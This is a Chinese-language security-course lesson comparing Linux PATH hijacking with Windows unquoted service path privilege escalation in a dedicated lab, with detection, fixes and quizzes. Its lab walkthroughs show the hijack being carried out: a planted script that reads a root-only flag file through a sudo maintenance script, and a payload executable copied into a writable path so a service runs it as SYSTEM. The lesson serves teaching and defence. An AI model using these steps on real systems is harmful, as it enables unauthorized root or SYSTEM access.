# Day 26：Linux PATH vs Windows Unquoted Path — 兩個 OS 都在回答「到底執行誰？」

## 背景知識

![Executable Resolution 背景資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-01.png)

我們在 Day 07（L03 PATH Hijacking）和 Day 18（W03 Unquoted Service Path）分別教了 Linux 和 Windows 各自的「Executable Resolution」提權。

今天的問題更深一層：

> 當一個高權限程式要「執行某個東西」，而名稱存在歧義時，OS 到底怎麼選？

這不是兩個「一樣的漏洞」。Linux PATH Hijacking 和 Windows Unquoted Service Path 的底層機制完全不同。但它們回答的核心問題相同：


---

## OS 原理：Linux Shell PATH Search

### Shell 怎麼找到要執行的程式？

![Linux Shell PATH Search 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-02.png)

當你在 Bash 中輸入 `fei-backup` 這個指令，Shell 會：

1. **檢查是否為 Built-in**：如果是 `cd`、`echo`、`export` 等 Shell 內建指令，直接執行
2. **檢查是否含 `/`**：如果指令包含斜線（如 `/usr/bin/find`），視為絕對或相對路徑，直接執行
3. **PATH Search**：如果只是一個「名字」（如 `fei-backup`），Shell 從 `$PATH` 環境變數中的目錄，**由左到右**逐一搜尋

```
PATH=/opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin:/usr/local/bin:/usr/bin:/bin
```

搜尋順序：


### 為什麼這可以被利用？

如果：
- 高權限 Script 設定了包含「使用者可寫目錄」的 PATH
- 該 Script 用「名字」呼叫子程式（不用絕對路徑）
- 使用者可寫目錄排在真正二進位前面

攻擊者只需要在可寫目錄放一個同名檔案，就能「劫持」執行。

### FEI Lab 實測（L03）

```
$ sudo -l
User fei-student may run the following commands on fei-privesc-linux:
    (root) NOPASSWD: /usr/local/bin/fei-l03-maintenance

$ cat /usr/local/bin/fei-l03-maintenance
#!/bin/bash
export PATH="/opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin:/usr/local/bin:/usr/bin:/bin"
echo "[FEI Maintenance] Running backup..."
fei-backup    # ← 用「名字」，不是絕對路徑！
```

```
$ ls -la /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/
drwxrwxrwx 2 root root 4096 ...    # ← 可寫！

$ printf '#!/bin/bash\ncat /root/fei-l03-flag.txt\n' > \
    /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/fei-backup
$ chmod +x /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/fei-backup
$ sudo /usr/local/bin/fei-l03-maintenance
[FEI Maintenance] Running backup...
FEI{LINUX_L03_PATH_ROOT_ACCESS}
```

---

## OS 原理：Windows CreateProcess Path Parsing

### Windows 怎麼解析含空格的路徑？

![Windows CreateProcess Path Parsing 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-03.png)

當 Windows Service Control Manager 拿到一個 **未加引號** 的 ImagePath，例如：

```
C:\FEI Training\W03 App\FEIService.exe
```

`CreateProcess` API 不知道空格是路徑分隔還是參數分隔。它會依序嘗試：


### 為什麼這可以被利用？

如果：
- Service 的 ImagePath **沒有引號**
- 路徑中**有空格**
- 某個中間候選位置的**父目錄可寫**
- Service 以**高權限**（如 LocalSystem）執行

攻擊者可以在中間候選位置放一個可執行檔。

### FEI Lab 實測（W03）

```
C:\> sc qc FEIUnquotedPathService
SERVICE_NAME: FEIUnquotedPathService
        BINARY_PATH_NAME   : C:\FEI Training\W03 App\FEIService.exe
        SERVICE_START_NAME : LocalSystem
```

注意：`BINARY_PATH_NAME` 沒有引號！

```
C:\> sc config FEIUnquotedPathService binPath= "test"
[SC] OpenService 無法 5: 存取被拒。       ← W01 不成立

C:\> icacls "C:\FEI Training\W03 App\FEIService.exe"
BUILTIN\Users:(RX)                        ← W02 不成立

C:\> icacls "C:\FEI Training"
BUILTIN\Users:(S,WD)                      ← 可建立檔案！
```

Windows path parsing 在第二次嘗試時會找 `C:\FEI Training\W03.exe`。而 `C:\FEI Training\` 可寫：

```
C:\> copy "C:\FEI-PrivEsc\Training\W03\tools\fei-payload-helper.exe" "C:\FEI Training\W03.exe"
C:\> sc stop FEIUnquotedPathService
C:\> sc start FEIUnquotedPathService
C:\> type "C:\Users\Public\fei-w03-proof.txt"
Scenario: FEI-W03-UNQUOTED-PATH
Identity: NT AUTHORITY\SYSTEM
Flag: FEI{WINDOWS_W03_UNQUOTED_PATH_SYSTEM_ACCESS}
```

---

## 跨平台並排比較

| 維度 | Linux PATH (L03) | Windows Unquoted Path (W03) |
|------|-------------------|------------------------------|
| **Resolution 觸發條件** | 指令只有「名字」，沒有 `/` | ImagePath 有空格且沒有引號 |
| **搜尋演算法** | 從 `$PATH` 左到右逐目錄 | 在每個空格處嘗試切割 |
| **攻擊者控制的是** | PATH 中的可寫目錄 | 中間候選路徑的可寫父目錄 |
| **放置的是** | 同名 shell script / binary | 候選名稱的 .exe |
| **高權限消費者** | root 執行的 maintenance script | LocalSystem 的 Service |
| **修復方式** | 使用絕對路徑 | 加引號 |
| **偵測方式** | 檢查 PATH 中的可寫目錄 | 掃描 ImagePath 是否有引號 |

### 共同抽象

![Executable Resolution 共同抽象資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-04.png)


---

## Lab 情境回顧

```
🔬 FEI Lab 環境

Linux (L03):
  VM: FEI-PRIVESC-LINUX (Ubuntu 22.04.4 LTS)
  Flag: FEI{LINUX_L03_PATH_ROOT_ACCESS}
  Verify: 15/15 PASS

Windows (W03):
  VM: FEI-PRIVESC-WINDOWS (Windows 10 Pro Build 19045)
  Flag: FEI{WINDOWS_W03_UNQUOTED_PATH_SYSTEM_ACCESS}
  Verify: 18/18 PASS
```

---

## Attack Path 對照

### Linux L03

![Linux L03 Attack Path 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-05.png)


### Windows W03

![Windows W03 Attack Path 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day26-executable-resolution-diagram-06.png)


---

## False Positive 分析

### Linux：PATH 有可寫目錄 ≠ 一定能提權

以下情況**看起來有 PATH 問題但不成立**：

1. **PATH 有可寫目錄，但沒有高權限程式使用 relative command**
   - PATH 設定影響的是「當下 Shell Session」
   - 如果沒有 root 程式呼叫 relative command，就沒有提權路徑

2. **高權限 Script 用了 relative command，但 PATH 固定使用 secure_path**
   - sudo 的 `secure_path` 設定會覆蓋使用者的 PATH
   - 需要確認 Script 內部有沒有自己重新 export PATH

3. **可寫目錄在 PATH 中，但排在真正 binary 後面**
   - PATH 是左到右搜尋
   - 如果真正的 binary 在可寫目錄之前被找到，劫持不成立

### Windows：看到 Unquoted Path ≠ 一定能提權

弱點掃描器最常回報 Unquoted Service Path，但以下情況**不成立**：

1. **路徑有空格但候選目錄都不可寫**
   - 例如 `C:\Program Files\Some App\service.exe`
   - `C:\` 不可寫、`C:\Program Files\` 通常也不可寫
   - 結論：Unquoted 但不 Exploitable

2. **路徑沒有空格**
   - `C:\FEIService\bin\service.exe` — 沒空格就沒有歧義
   - CreateProcess 不需要猜測

3. **Service 不是高權限**
   - 如果 Service 以 standard user 執行，就算劫持成功也沒有提權效果

4. **候選位置已存在不可修改的檔案**
   - 例如 `C:\Program.exe` 如果已存在且不可覆寫，攻擊者放不進去

---

## Edge Case

### Linux：sudo env_reset vs env_keep

`sudoers` 的 `env_reset` 設定會影響 sudo 執行時的 PATH。如果 sudo 設定了 `secure_path`（大多數 Linux 發行版的預設），使用者的 PATH 會被覆蓋。

但如果：
- Script **內部**重新 `export PATH=...`（如 L03 的 maintenance script）
- 或使用 `env_keep+=PATH` 保留原始 PATH

那麼 PATH Hijacking 仍然可行。L03 的設計就是在 Script 內部設定 PATH，繞過 sudo 的 secure_path。

### Windows：SafeDllSearchMode 和 PATH 的交互

Windows 還有另一個 search 機制：DLL Search Order（Day 24）。兩者是不同的機制：
- Unquoted Service Path：影響「哪個 EXE 被啟動」
- DLL Search Order：影響「EXE 啟動後載入哪個 DLL」

這兩個可以同時存在但分開利用。

---

## Troubleshooting

### Linux 常見問題

| 問題 | 原因 | 解法 |
|------|------|------|
| 放了假 binary 但 sudo 執行沒效果 | secure_path 覆蓋了 PATH | 確認 Script 內部是否重新設定 PATH |
| 假 binary 沒有被執行 | 忘記 `chmod +x` | 加上執行權限 |
| PATH 正確但找不到假 binary | 檔名拼錯 | 確認與 Script 中呼叫的名稱完全一致 |

### Windows 常見問題

| 問題 | 原因 | 解法 |
|------|------|------|
| `sc config` 被拒 | Service ACL 安全（W01 不成立）| 這就是 W03 的設計 — 要走 Unquoted Path |
| 候選位置不可寫 | 目錄 ACL 不允許 | 確認 `icacls` 輸出，找可寫的候選 |
| Service 啟動後報錯 1053 | payload 不是合法 Service | 正常行為 — payload 執行完畢 |
| `C:\Program.exe` 已存在 | 某些系統有此殘留 | 不影響其他候選位置 |

---

## Defense 防禦

### Linux

```
Detect:
  grep -rn "export PATH" /usr/local/bin/ /opt/ /etc/
  # 找出哪些 root-owned script 修改了 PATH
  
  # 檢查 PATH 中的可寫目錄
  echo $PATH | tr ':' '\n' | while read d; do
    [ -w "$d" ] && echo "WRITABLE: $d"
  done

Prevent:
  # 所有 Script 使用絕對路徑
  /usr/bin/rsync 而不是 rsync
  
  # sudoers 保持 secure_path
  Defaults    secure_path="/usr/local/sbin:..."

Verify:
  # 修完後確認：Script 中沒有 relative command
  grep -v "^#" /usr/local/bin/fei-l03-maintenance | grep -v "^$" | grep -v "/"
```

### Windows

```
Detect:
  # PowerShell — 找所有 Unquoted Service Path
  Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and $_.PathName -match '\s'
  } | Select-Object Name, PathName, StartName

Prevent:
  # 修正 ImagePath 加上引號
  sc config ServiceName binPath= '"C:\Path With Spaces\service.exe"'
  
  # 或避免安裝到含空格的路徑

Verify:
  # 確認修正後的 ImagePath
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v ImagePath
  # 應該以 " 開頭
```

---

## Detection 偵測

### Linux

| 偵測點 | 方法 |
|--------|------|
| 新檔案出現在 PATH 目錄 | `inotifywait` 監控 PATH 中的可寫目錄 |
| Script 內容修改 | `AIDE` / `Tripwire` 偵測 root-owned script 變更 |
| 可疑 sudo 執行 | `/var/log/auth.log` 中的 sudo command |

### Windows

| 偵測點 | Event ID |
|--------|----------|
| 新 .exe 建立在 Service 路徑 | Sysmon Event ID 11 (FileCreate) |
| Service 啟動異常 | Event ID 7045 (new service) / 7036 (state change) |
| 可疑路徑的 Process 啟動 | Sysmon Event ID 1 (ProcessCreate) |

---

## Fix Verification 修復驗證

### Linux — 修復後驗證

```bash
# 1. 確認 Script 使用絕對路徑
cat /usr/local/bin/fei-l03-maintenance | grep -v '^#' | grep -v '^$'
# 所有指令都應該有 /

# 2. 確認 PATH 中沒有可寫目錄
echo "$PATH" | tr ':' '\n' | while read d; do
  stat -c "%A %U %G %n" "$d" 2>/dev/null
done
# 不應該有 drwxrwxrwx

# 3. 嘗試攻擊 — 應該失敗
printf '#!/bin/bash\necho HIJACKED\n' > /opt/.../user-bin/fei-backup
sudo /usr/local/bin/fei-l03-maintenance
# 不應該看到 HIJACKED
```

### Windows — 修復後驗證

```powershell
# 1. 確認 ImagePath 有引號
$svc = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName"
$svc.ImagePath  # 應該以 " 開頭

# 2. 確認候選目錄不可寫
icacls "C:\FEI Training"
# Users 不應該有 (W) 或 (F)

# 3. 嘗試建立候選 — 應該失敗
copy test.exe "C:\FEI Training\W03.exe"
# 應該 Access Denied
```

---

## Exercise 練習

### 練習 1：在你的系統上測試 PATH Search

```bash
# Linux
echo $PATH | tr ':' '\n' | nl
# 看看有幾個目錄、順序是什麼

# 檢查可寫性
echo $PATH | tr ':' '\n' | while read d; do
  [ -w "$d" ] && echo "⚠️ WRITABLE: $d" || echo "✅ $d"
done
```

### 練習 2：在你的 Windows 上掃描 Unquoted Service Path

```powershell
Get-WmiObject Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and $_.PathName -match '\s'
} | Select-Object Name, PathName, StartMode, StartName | Format-Table -AutoSize
```

> 注意：找到 Unquoted Path 不代表能利用。你還需要確認候選位置是否可寫、Service 是否高權限。

### 練習 3：思考題

如果 Linux Script 使用了 `env -i PATH=/usr/bin command`，PATH Hijacking 還成立嗎？為什麼？

---

## Quiz 測驗

**Q1**: Linux PATH Search 是從哪個方向搜尋的？
A) 右到左  B) 左到右  C) 隨機  D) 按字母順序

### 答案B) 左到右。PATH 中排在前面的目錄優先。

**Q2**: Windows Unquoted Service Path 的四個必要條件是？

### 答案
1. ImagePath 未加引號
2. 路徑中含空格
3. 至少一個候選位置的父目錄可寫
4. Service 以高權限執行


**Q3**: 看到 `C:\Program Files\App\service.exe` 未加引號，這一定能提權嗎？

### 答案不一定。`C:\` 和 `C:\Program Files\` 通常不可寫，所以候選位置（`C:\Program.exe` 和 `C:\Program Files\App.exe`）無法被建立。

**Q4**: L03 的 maintenance script 為什麼可以繞過 sudo 的 secure_path？

### 答案因為 Script 內部用 `export PATH=...` 重新設定了 PATH。sudo 的 secure_path 只影響 sudo 啟動時的 PATH，但 Script 內部可以覆蓋。

**Q5**: 在 L03 中，如果 user-bin 排在 /usr/local/bin **後面**，攻擊還能成功嗎？

### 答案不能。真正的 fei-backup 在 /usr/local/bin 會先被找到，攻擊者的假 binary 不會被執行。PATH search 是左到右，先找到的先執行。

---

## Engineering Note 工程筆記

L03 和 W03 在建置時都是 **Phase 5 零 bug 通過**的場景。但值得記錄的是：

### L03 — sudo secure_path 的設計考量

L03 的 maintenance script 內部設定 `export PATH=...`，這是刻意設計。如果只依賴 sudo 的 `$PATH`，因為 Ubuntu 22.04 的 `secure_path` 預設值只包含系統目錄，使用者根本無法影響 PATH。

因此 L03 的漏洞模型是：**root-owned script 自己設定了不安全的 PATH**。這比單純「PATH 有可寫目錄」更貼近真實場景（例如部署腳本、CI/CD pipeline）。

### W03 — 實際 path resolution 驗證

W03 的 Unquoted Path 在 Windows 10 Build 19045 上實際驗證了候選順序：

```
Candidate 1: C:\FEI.exe          → C:\ 不可寫 → 失敗
Candidate 2: C:\FEI Training\W03.exe  → 可寫！→ 成功
Candidate 3: C:\FEI Training\W03 App\FEIService.exe → 原始 binary
```

Verify 腳本特別檢查了四個維度分開驗證：
- Service ACL safe（W01 不成立）
- Binary ACL safe（W02 不成立）
- Candidate dir writable（W03 漏洞所在）
- ImagePath unquoted（W03 前提條件）

---

## 今天真正要記住的 3 件事

1. **兩個 OS 都有「名稱解析」造成的提權風險，但機制完全不同**
   - Linux：PATH 左到右搜尋
   - Windows：空格處嘗試分割

2. **掃描到 Unquoted Path 或 writable PATH dir 不等於一定能提權**
   - 必須確認：可寫位置、執行權限、觸發方式

3. **修復的核心都是「消除歧義」**
   - Linux：使用絕對路徑
   - Windows：加引號

---

## 給自己的問題

> Linux 的 PATH Hijacking 影響的是「哪個 binary 被找到」。Windows 的 DLL Hijacking（Day 24）影響的是「哪個 DLL 被載入」。如果一個 SYSTEM Service 同時有 Unquoted Path 和 DLL loading issue，你會先利用哪一個？為什麼？

---

## 下一篇

Day 27 — Cron vs Scheduled Task：排程真正危險的不是「定時」，而是「誰執行了什麼」。
